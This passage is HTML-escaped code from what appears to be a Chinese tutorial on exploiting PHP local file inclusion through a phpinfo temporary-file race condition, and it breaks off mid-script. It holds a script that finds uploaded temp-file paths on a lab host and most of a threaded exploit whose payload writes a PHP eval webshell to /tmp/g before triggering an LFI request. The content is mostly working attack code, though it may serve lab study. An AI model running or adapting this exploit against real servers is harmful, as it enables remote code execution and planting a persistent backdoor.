&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; io &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; BytesIO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;files = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;?php echo &amp;#x27;yanchuang is cool!&amp;#x27;;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://172.16.60.64/xss_location/include/phpinfo.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(url=url, files=files, allow_redirects=&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = re.search(&lt;span class=&#34;string&#34;&gt;&amp;quot;(?&amp;lt;=tmp_name] =&amp;amp;gt; ).*&amp;quot;&lt;/span&gt;, r.content.decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)).group(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(data)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了延缓删除临时文件，我们需要 post 更长的文件，通知启用大量线程&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;setup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;host, port&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TAG = &lt;span class=&#34;string&#34;&gt;&amp;quot;Security Test&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PAYLOAD = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%s\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;?php fputs(fopen(&amp;#x27;/tmp/g&amp;#x27;,&amp;#x27;w&amp;#x27;),&amp;#x27;&amp;lt;?php @eval($_POST[a]);&amp;#x27;)?&amp;gt;\r&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % TAG&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    REQ1_DATA = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;-----------------------------7dbff1ded0714\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Disposition: form-data; name=&amp;quot;dummyname&amp;quot;; filename=&amp;quot;test.txt&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: text/plain\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;%s&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------7dbff1ded0714--\r&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % PAYLOAD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    padding = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;5000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    REQ1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;POST /phpinfo.php?a=&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot; HTTP/1.1\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;HTTP_ACCEPT: &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;HTTP_USER_AGENT: &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;HTTP_ACCEPT_LANGUAGE: &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;HTTP_PRAGMA: &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; + padding + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Length: %s\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Host: %s\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;%s&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % (&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(REQ1_DATA), host, REQ1_DATA)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# modify this to suit the LFI script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LFIREQ = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;GET /lfi.php?file=%s HTTP/1.1\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;User-Agent: Mozilla/4.0\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Proxy-Connection: Keep-Alive\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Host: %s\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;\r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (REQ1, TAG, LFIREQ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;phpInfoLFI&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;host, port, phpinforeq, offset, lfireq, tag&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.connect((host, port))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s2.connect((host, port))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.send(phpinforeq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(d) &amp;lt; offset:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        d += s.recv(offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = d.index(&lt;span class=&#34;string&#34;&gt;&amp;quot;[tmp_name] =&amp;amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fn = d[i + &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;:i + &lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; ValueError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        